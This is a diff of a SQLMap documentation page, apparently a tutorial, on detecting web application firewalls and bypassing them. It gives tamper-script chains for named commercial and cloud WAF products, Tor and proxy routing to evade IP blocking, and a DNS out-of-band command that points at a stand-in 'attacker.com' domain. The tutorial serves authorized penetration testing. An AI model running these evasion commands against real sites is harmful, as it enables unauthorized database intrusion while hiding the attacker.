@@ -5,144 +5,492 @@ description: Learn how to detect and bypass Web Application Firewalls using SQLM
 
 # WAF Detection and Bypass
 
-Web Application Firewalls (WAFs) are security systems designed to protect web applications from various attacks, including SQL injection. SQLMap includes features to detect and bypass WAFs during authorized security testing.
-
-## Detecting WAFs
-
-### Automatic WAF Detection
-
-SQLMap can automatically detect the presence of a WAF:
-
-```bash
-sqlmap -u "http://www.example.com/vuln.php?id=1" --identify-waf
-```
-
-This attempts to identify if a WAF is protecting the target application and, if possible, determine which specific WAF product is in use.
-
-### Detailed WAF Fingerprinting
-
-For more detailed WAF fingerprinting:
-
-```bash
-sqlmap -u "http://www.example.com/vuln.php?id=1" --fingerprint
-```
-
-This performs a more comprehensive fingerprinting of the target, including WAF detection.
-
-## Common WAF Bypass Techniques
-
-### Level and Risk Adjustment
-
-Increasing the test level and risk can help bypass some WAFs:
-
-```bash
-sqlmap -u "http://www.example.com/vuln.php?id=1" --level=5 --risk=3
-```
-
-Higher levels and risks use more sophisticated techniques that might evade WAF detection.
-
-### Tamper Scripts
-
-SQLMap's tamper scripts modify payloads to bypass WAF filters:
-
-```bash
-sqlmap -u "http://www.example.com/vuln.php?id=1" --tamper=space2comment,between
-```
-
-This example uses two tamper scripts:
-- `space2comment`: Replaces spaces with comments
-- `between`: Replaces greater-than and less-than operators with BETWEEN statements
-
-### Chaining Multiple Tamper Scripts
-
-You can chain multiple tamper scripts for more effective evasion:
-
-```bash
-sqlmap -u "http://www.example.com/vuln.php?id=1" --tamper=space2comment,between,charencode,randomcase
-```
-
-The scripts are applied in the specified order, creating a more heavily obfuscated payload.
-
-## WAF-Specific Bypass Techniques
-
-### ModSecurity Bypass
-
-For ModSecurity WAF:
-
-```bash
-sqlmap -u "http://www.example.com/vuln.php?id=1" --tamper=modsecurityversioned,space2comment,charunicodeencode
-```
-
-### Cloudflare Bypass
-
-For Cloudflare WAF:
-
-```bash
-sqlmap -u "http://www.example.com/vuln.php?id=1" --tamper=cloudflare,randomcase,charencode
-```
-
-### F5 BIG-IP ASM Bypass
-
-For F5 BIG-IP Application Security Manager:
-
-```bash
-sqlmap -u "http://www.example.com/vuln.php?id=1" --tamper=between,charunicodeencode,space2randomblank
-```
-
-## Advanced Evasion Settings
-
-### Custom User-Agent
-
-Using a legitimate-looking user agent:
-
-```bash
-sqlmap -u "http://www.example.com/vuln.php?id=1" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
-```
-
-### Random User-Agent
-
-Using a random user agent for each request:
-
-```bash
-sqlmap -u "http://www.example.com/vuln.php?id=1" --random-agent
-```
-
-### Request Delays
-
-Adding delays between requests to avoid rate limiting:
-
-```bash
-sqlmap -u "http://www.example.com/vuln.php?id=1" --delay=2 --timeout=30
-```
-
-This adds a 2-second delay between requests and sets a 30-second timeout.
-
-### Tor Network Routing
-
-Routing requests through the Tor network:
-
-```bash
-sqlmap -u "http://www.example.com/vuln.php?id=1" --tor --tor-type=SOCKS5
-```
-
-This routes all SQLMap traffic through the Tor network, making it harder to trace.
-
-<Note title="Ethical and Legal Warning">
+<Note title="Security Warning" type="warning">
 WAF bypass techniques should only be used in authorized security testing scenarios. Unauthorized attempts to bypass security controls are illegal and unethical.
 </Note>
 
+<Tabs defaultValue="overview" className="pt-5 pb-1">
+  <TabsList>
+    <TabsTrigger value="overview">Overview</TabsTrigger>
+    <TabsTrigger value="waf-types">WAF Types</TabsTrigger>
+    <TabsTrigger value="detection-methods">Detection Methods</TabsTrigger>
+  </TabsList>
+  
+  <TabsContent value="overview">
+    <p>Web Application Firewalls (WAFs) are security systems designed to protect web applications from various attacks, including SQL injection. They analyze HTTP traffic to identify and block malicious requests before they reach the application.</p>
+    
+    <p className="mt-2">SQLMap includes sophisticated features to detect the presence of WAFs and implement various bypass techniques during authorized security testing. This helps security professionals assess the true effectiveness of WAF protections.</p>
+  </TabsContent>
+  
+  <TabsContent value="waf-types">
+    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+      <div>
+        <h4>Commercial WAFs</h4>
+        <ul>
+          <li><strong>Cloudflare WAF</strong> - Cloud-based protection service</li>
+          <li><strong>F5 BIG-IP ASM</strong> - Enterprise-grade application security</li>
+          <li><strong>Imperva SecureSphere</strong> - Database and application security</li>
+          <li><strong>Akamai Kona</strong> - Edge security platform</li>
+          <li><strong>Fortinet FortiWeb</strong> - Dedicated web application firewall</li>
+        </ul>
+      </div>
+      <div>
+        <h4>Open Source WAFs</h4>
+        <ul>
+          <li><strong>ModSecurity</strong> - Apache/Nginx module for web application firewall</li>
+          <li><strong>NAXSI</strong> - Nginx Anti-XSS & SQL Injection</li>
+          <li><strong>Shadow Daemon</strong> - Web application firewall system</li>
+          <li><strong>WebKnight</strong> - Application firewall for IIS</li>
+          <li><strong>OWASP CRS</strong> - Core Rule Set for ModSecurity</li>
+        </ul>
+      </div>
+    </div>
+  </TabsContent>
+  
+  <TabsContent value="detection-methods">
+    <h4>How SQLMap Detects WAFs</h4>
+    <ol>
+      <li><strong>Behavioral Analysis</strong> - Observes how the application responds to specific payloads</li>
+      <li><strong>Response Headers</strong> - Examines headers that may reveal WAF presence</li>
+      <li><strong>Error Messages</strong> - Analyzes custom error responses typical of WAFs</li>
+      <li><strong>Fingerprinting</strong> - Uses known signatures to identify specific WAF products</li>
+      <li><strong>Timing Analysis</strong> - Measures response time variations that indicate WAF processing</li>
+    </ol>
+    
+    <div className="bg-muted p-3 rounded-md mt-4">
+      <h5 className="font-bold">Pro Tip</h5>
+      <p>WAF detection is most effective when combined with verbose mode (<code>-v</code>) to see detailed information about the detection process.</p>
+    </div>
+  </TabsContent>
+</Tabs>
+
+## WAF Detection and Bypass Workflow
+
+<Stepper>
+  <StepperItem title="Detect WAF Presence">
+    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+      <div>
+        <h4>Basic WAF Detection</h4>
+        
+        ```bash
+        # Identify if a WAF is present
+        sqlmap -u "http://www.example.com/vuln.php?id=1" \
+          --identify-waf
+        ```
+        
+        <p className="text-sm mt-2">This command attempts to identify if a WAF is protecting the target application and, if possible, determine which specific WAF product is in use.</p>
+      </div>
+      <div>
+        <h4>Detailed Fingerprinting</h4>
+        
+        ```bash
+        # More comprehensive fingerprinting
+        sqlmap -u "http://www.example.com/vuln.php?id=1" \
+          --fingerprint
+        
+        # With verbose output
+        sqlmap -u "http://www.example.com/vuln.php?id=1" \
+          --identify-waf -v 3
+        ```
+        
+        <p className="text-sm mt-2">The <code>--fingerprint</code> option performs more comprehensive analysis of the target, including WAF detection. Adding verbosity with <code>-v</code> provides detailed information about the detection process.</p>
+      </div>
+    </div>
+  </StepperItem>
+  
+  <StepperItem title="Adjust Testing Parameters">
+    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+      <div>
+        <h4>Level and Risk Adjustment</h4>
+        
+        ```bash
+        # Increase sophistication of tests
+        sqlmap -u "http://www.example.com/vuln.php?id=1" \
+          --level=5 --risk=3
+        ```
+        
+        <p className="text-sm mt-2">Higher levels and risks use more sophisticated techniques that might evade WAF detection. Level ranges from 1-5, and risk ranges from 1-3.</p>
+        
+        <ul className="mt-2 text-sm">
+          <li><strong>Level</strong>: Controls test thoroughness (default: 1)</li>
+          <li><strong>Risk</strong>: Controls potentially harmful tests (default: 1)</li>
+        </ul>
+      </div>
+      <div>
+        <h4>Technique Selection</h4>
+        
+        ```bash
+        # Specify injection techniques
+        sqlmap -u "http://www.example.com/vuln.php?id=1" \
+          --technique=BT
+        ```
+        
+        <p className="text-sm mt-2">Specify which SQL injection techniques to use:</p>
+        
+        <ul className="mt-2 text-sm">
+          <li><code>B</code>: Boolean-based blind</li>
+          <li><code>E</code>: Error-based</li>
+          <li><code>U</code>: Union query-based</li>
+          <li><code>S</code>: Stacked queries</li>
+          <li><code>T</code>: Time-based blind</li>
+          <li><code>Q</code>: Inline queries</li>
+        </ul>
+        
+        <div className="bg-muted p-3 rounded-md mt-4">
+          <h5 className="font-bold">Pro Tip</h5>
+          <p>Time-based techniques (<code>T</code>) are often more effective against WAFs as they're harder to detect.</p>
+        </div>
+      </div>
+    </div>
+  </StepperItem>
+</Stepper>
+
+<StepperItem title="Apply Tamper Scripts">
+  <div className="mb-4">
+    <p>Tamper scripts are one of SQLMap's most powerful evasion features. They modify payloads to bypass WAF filters while maintaining the payload's functionality.</p>
+  </div>
+  
+  <Tabs defaultValue="basic" className="pt-2 pb-1">
+    <TabsList>
+      <TabsTrigger value="basic">Basic Usage</TabsTrigger>
+      <TabsTrigger value="chaining">Script Chaining</TabsTrigger>
+      <TabsTrigger value="categories">Script Categories</TabsTrigger>
+    </TabsList>
+    
+    <TabsContent value="basic">
+      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+        <div>
+          <h4>Using Tamper Scripts</h4>
+          
+          ```bash
+          # Apply a single tamper script
+          sqlmap -u "http://www.example.com/vuln.php?id=1" \
+            --tamper=space2comment
+          
+          # Apply multiple tamper scripts
+          sqlmap -u "http://www.example.com/vuln.php?id=1" \
+            --tamper=space2comment,between
+          ```
+          
+          <p className="text-sm mt-2">The <code>--tamper</code> parameter accepts a comma-separated list of tamper script names. Each script modifies the payload in a specific way to evade WAF detection.</p>
+        </div>
+        <div>
+          <h4>Common Tamper Scripts</h4>
+          <ul className="text-sm">
+            <li><code>space2comment</code> - Replaces spaces with comments</li>
+            <li><code>between</code> - Replaces greater/less than with BETWEEN</li>
+            <li><code>randomcase</code> - Randomizes case of SQL keywords</li>
+            <li><code>charencode</code> - URL-encodes characters</li>
+            <li><code>charunicodeencode</code> - Unicode-encodes characters</li>
+            <li><code>base64encode</code> - Base64-encodes payload</li>
+            <li><code>hex2char</code> - Converts hex to characters</li>
+          </ul>
+          
+          <div className="bg-muted p-3 rounded-md mt-4">
+            <h5 className="font-bold">Pro Tip</h5>
+            <p>Use <code>sqlmap --list-tampers</code> to see all available tamper scripts with descriptions.</p>
+          </div>
+        </div>
+      </div>
+    </TabsContent>
+    
+    <TabsContent value="chaining">
+      <h4>Chaining Multiple Tamper Scripts</h4>
+      
+      ```bash
+      # Chain multiple tamper scripts for more effective evasion
+      sqlmap -u "http://www.example.com/vuln.php?id=1" \
+        --tamper=space2comment,between,charencode,randomcase
+      ```
+      
+      <p className="mt-2">When chaining multiple tamper scripts:</p>
+      <ol className="mt-2">
+        <li>Scripts are applied in the specified order from left to right</li>
+        <li>Each script modifies the output of the previous script</li>
+        <li>Order matters - different orders can produce different results</li>
+        <li>Not all combinations are effective - some may conflict</li>
+      </ol>
+      
+      <div className="border-l-4 border-yellow-500 pl-4 py-2 bg-yellow-50 dark:bg-yellow-900/20 mt-4">
+        <h5 className="font-bold">Important</h5>
+        <p>Excessive payload obfuscation may impact SQLMap's ability to parse responses correctly. If you encounter issues, try using fewer tamper scripts or different combinations.</p>
+      </div>
+    </TabsContent>
+    
+    <TabsContent value="categories">
+      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+        <div>
+          <h4>Character Encoding Scripts</h4>
+          <ul className="text-sm">
+            <li><code>charencode</code> - URL encoding</li>
+            <li><code>charunicodeencode</code> - Unicode encoding</li>
+            <li><code>base64encode</code> - Base64 encoding</li>
+            <li><code>hex2char</code> - Hex encoding</li>
+            <li><code>percentage</code> - Adds % to spaces</li>
+          </ul>
+          
+          <h4 className="mt-4">Whitespace Manipulation</h4>
+          <ul className="text-sm">
+            <li><code>space2comment</code> - Spaces to comments</li>
+            <li><code>space2dash</code> - Spaces to dashes</li>
+            <li><code>space2hash</code> - Spaces to hashes</li>
+            <li><code>space2plus</code> - Spaces to plus signs</li>
+            <li><code>space2randomblank</code> - Random whitespace</li>
+          </ul>
+        </div>
+        <div>
+          <h4>Syntax Manipulation</h4>
+          <ul className="text-sm">
+            <li><code>between</code> - Uses BETWEEN for comparisons</li>
+            <li><code>equaltolike</code> - = to LIKE conversions</li>
+            <li><code>greatest</code> - Uses GREATEST() function</li>
+            <li><code>ifnull2ifisnull</code> - IFNULL to IF(ISNULL)</li>
+            <li><code>modsecurityversioned</code> - For ModSecurity WAF</li>
+            <li><code>modsecurityzeroversioned</code> - ModSecurity variant</li>
+            <li><code>multiplespaces</code> - Adds multiple spaces</li>
+            <li><code>randomcase</code> - Random case for keywords</li>
+            <li><code>versionedkeywords</code> - Adds version comments</li>
+            <li><code>versionedmorekeywords</code> - More version comments</li>
+          </ul>
+        </div>
+      </div>
+    </TabsContent>
+  </Tabs>
+</StepperItem>
+
+<StepperItem title="WAF-Specific Bypass Techniques">
+  <Tabs defaultValue="commercial" className="pt-2 pb-1">
+    <TabsList>
+      <TabsTrigger value="commercial">Commercial WAFs</TabsTrigger>
+      <TabsTrigger value="opensource">Open Source WAFs</TabsTrigger>
+      <TabsTrigger value="cloud">Cloud WAFs</TabsTrigger>
+    </TabsList>
+    
+    <TabsContent value="commercial">
+      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+        <div className="border p-4 rounded-md">
+          <h4 className="font-bold">F5 BIG-IP ASM</h4>
+          
+          ```bash
+          sqlmap -u "http://www.example.com/vuln.php?id=1" \
+            --tamper=between,charunicodeencode,space2randomblank \
+            --random-agent
+          ```
+          
+          <p className="text-sm mt-2">F5 BIG-IP ASM focuses on parameter validation and SQL keyword detection. Unicode encoding and randomized whitespace are particularly effective.</p>
+        </div>
+        
+        <div className="border p-4 rounded-md">
+          <h4 className="font-bold">Imperva SecureSphere</h4>
+          
+          ```bash
+          sqlmap -u "http://www.example.com/vuln.php?id=1" \
+            --tamper=apostrophemask,randomcase,charencode \
+            --time-sec=3
+          ```
+          
+          <p className="text-sm mt-2">Imperva has strong signature detection. Apostrophe masking and character encoding combined with time-based techniques can be effective.</p>
+        </div>
+        
+        <div className="border p-4 rounded-md">
+          <h4 className="font-bold">Fortinet FortiWeb</h4>
+          
+          ```bash
+          sqlmap -u "http://www.example.com/vuln.php?id=1" \
+            --tamper=space2comment,randomcase,versionedkeywords \
+            --delay=1
+          ```
+          
+          <p className="text-sm mt-2">FortiWeb often looks for SQL keywords and suspicious patterns. Versioned keywords and comment injection can help bypass detection.</p>
+        </div>
+      </div>
+    </TabsContent>
+    
+    <TabsContent value="opensource">
+      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+        <div className="border p-4 rounded-md">
+          <h4 className="font-bold">ModSecurity</h4>
+          
+          ```bash
+          sqlmap -u "http://www.example.com/vuln.php?id=1" \
+            --tamper=modsecurityversioned,space2comment,charunicodeencode \
+            --random-agent
+          ```
+          
+          <p className="text-sm mt-2">ModSecurity with OWASP CRS is particularly sensitive to SQL keywords. The <code>modsecurityversioned</code> tamper script was specifically designed for it.</p>
+        </div>
+        
+        <div className="border p-4 rounded-md">
+          <h4 className="font-bold">NAXSI</h4>
+          
+          ```bash
+          sqlmap -u "http://www.example.com/vuln.php?id=1" \
+            --tamper=between,charencode,randomcase \
+            --technique=T
+          ```
+          
+          <p className="text-sm mt-2">NAXSI uses a scoring system based on suspicious patterns. Character encoding and using time-based techniques can help stay under detection thresholds.</p>
+        </div>
+      </div>
+    </TabsContent>
+    
+    <TabsContent value="cloud">
+      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+        <div className="border p-4 rounded-md">
+          <h4 className="font-bold">Cloudflare WAF</h4>
+          
+          ```bash
+          sqlmap -u "http://www.example.com/vuln.php?id=1" \
+            --tamper=cloudflare,randomcase,charencode \
+            --delay=2
+          ```
+          
+          <p className="text-sm mt-2">Cloudflare has specific signatures for SQLi. The <code>cloudflare</code> tamper script was designed specifically to bypass some of these rules.</p>
+        </div>
+        
+        <div className="border p-4 rounded-md">
+          <h4 className="font-bold">AWS WAF</h4>
+          
+          ```bash
+          sqlmap -u "http://www.example.com/vuln.php?id=1" \
+            --tamper=space2comment,charunicodeencode,randomcase \
+            --technique=BT
+          ```
+          
+          <p className="text-sm mt-2">AWS WAF uses both signature and behavioral detection. Combining unicode encoding with boolean and time-based techniques can be effective.</p>
+        </div>
+        
+        <div className="border p-4 rounded-md">
+          <h4 className="font-bold">Akamai Kona</h4>
+          
+          ```bash
+          sqlmap -u "http://www.example.com/vuln.php?id=1" \
+            --tamper=apostrophemask,charencode,equaltolike \
+            --random-agent --delay=1
+          ```
+          
+          <p className="text-sm mt-2">Akamai has sophisticated pattern matching. Apostrophe masking and replacing equals with LIKE can help evade detection.</p>
+        </div>
+      </div>
+    </TabsContent>
+  </Tabs>
+</StepperItem>
+
+<StepperItem title="Advanced Evasion Settings">
+  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+    <div className="border p-4 rounded-md">
+      <h4 className="font-bold">HTTP Header Manipulation</h4>
+      
+      ```bash
+      # Custom user-agent
+      sqlmap -u "http://www.example.com/vuln.php?id=1" \
+        --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
+        AppleWebKit/537.36 (KHTML, like Gecko) \
+        Chrome/91.0.4472.124 Safari/537.36"
+      
+      # Random user-agent
+      sqlmap -u "http://www.example.com/vuln.php?id=1" \
+        --random-agent
+      
+      # Custom headers
+      sqlmap -u "http://www.example.com/vuln.php?id=1" \
+        --headers="X-Forwarded-For: 192.168.1.1\nReferer: https://www.google.com"
+      ```
+      
+      <p className="text-sm mt-2">Many WAFs analyze HTTP headers to detect automated tools. Using legitimate-looking headers can help bypass this detection.</p>
+    </div>
+    
+    <div className="border p-4 rounded-md">
+      <h4 className="font-bold">Request Timing and Routing</h4>
+      
+      ```bash
+      # Add delays between requests
+      sqlmap -u "http://www.example.com/vuln.php?id=1" \
+        --delay=2 --timeout=30
+      
+      # Route through Tor
+      sqlmap -u "http://www.example.com/vuln.php?id=1" \
+        --tor --tor-type=SOCKS5
+      
+      # Use a proxy
+      sqlmap -u "http://www.example.com/vuln.php?id=1" \
+        --proxy=http://127.0.0.1:8080
+      ```
+      
+      <p className="text-sm mt-2">WAFs often use rate limiting and IP-based blocking. Adding delays between requests and routing through proxies or Tor can help evade these mechanisms.</p>
+    </div>
+    
+    <div className="border p-4 rounded-md">
+      <h4 className="font-bold">Cookie and Parameter Handling</h4>
+      
+      ```bash
+      # Custom cookie
+      sqlmap -u "http://www.example.com/vuln.php?id=1" \
+        --cookie="PHPSESSID=a8d127e...; login=1"
+      
+      # Test all parameters
+      sqlmap -u "http://www.example.com/vuln.php" \
+        --data="id=1&user=test&action=login" --level=5
+      ```
+      
+      <p className="text-sm mt-2">Using legitimate-looking cookies and testing multiple parameters can help identify injection points that may be less protected by WAFs.</p>
+    </div>
+    
+    <div className="border p-4 rounded-md">
+      <h4 className="font-bold">Alternative Techniques</h4>
+      
+      ```bash
+      # Out-of-band testing
+      sqlmap -u "http://www.example.com/vuln.php?id=1" \
+        --dns-domain=attacker.com
+      
+      # Second-order injection
+      sqlmap -u "http://www.example.com/vuln.php" \
+        --second-url="http://www.example.com/display.php"
+      ```
+      
+      <p className="text-sm mt-2">Out-of-band and second-order techniques can bypass WAFs by moving the actual exploitation outside the WAF's monitoring scope.</p>
+    </div>
+  </div>
+</StepperItem>
+
 ## Troubleshooting WAF Bypasses
 
-If you're having trouble bypassing a WAF:
+<div className="grid grid-cols-1 md:grid-cols-3 gap-4 mt-6">
+  <div className="border p-4 rounded-md">
+    <h4 className="font-bold">Common Issues</h4>
+    <ul className="mt-2">
+      <li>WAF blocks all requests</li>
+      <li>False positives in detection</li>
+      <li>Payload gets sanitized</li>
+      <li>Rate limiting triggers</li>
+      <li>IP gets blacklisted</li>
+    </ul>
+  </div>
+  
+  <div className="border p-4 rounded-md">
+    <h4 className="font-bold">Diagnostic Steps</h4>
+    <ol className="mt-2">
+      <li>Use verbose mode (<code>-v 3</code>)</li>
+      <li>Try different tamper combinations</li>
+      <li>Test different injection techniques</li>
+      <li>Verify vulnerability manually</li>
+      <li>Check for WAF fingerprints</li>
+    </ol>
+  </div>
+  
+  <div className="border p-4 rounded-md">
+    <h4 className="font-bold">Success Factors</h4>
+    <ul className="mt-2">
+      <li>WAF product and configuration</li>
+      <li>Rule set and update status</li>
+      <li>Injection vulnerability type</li>
+      <li>Database management system</li>
+      <li>Application architecture</li>
+    </ul>
+  </div>
+</div>
 
-1. Try different combinations of tamper scripts
-2. Use verbose mode (`-v`) to see what's happening
-3. Try different injection techniques with `--technique`
-4. Use time-based blind techniques which may be harder for WAFs to detect
-5. Consider using out-of-band techniques with `--dns-domain`
-
-Remember that WAF evasion success depends on:
-- The specific WAF product and its configuration
-- The WAF's rule set and update status
-- The specific SQL injection vulnerability
-- The database management system in use
+<Note title="Best Practice" type="info">
+WAF evasion is a complex process that often requires trial and error. Start with the simplest approach and gradually increase complexity. Document successful techniques for future reference, as they may be useful in similar environments.
+</Note>
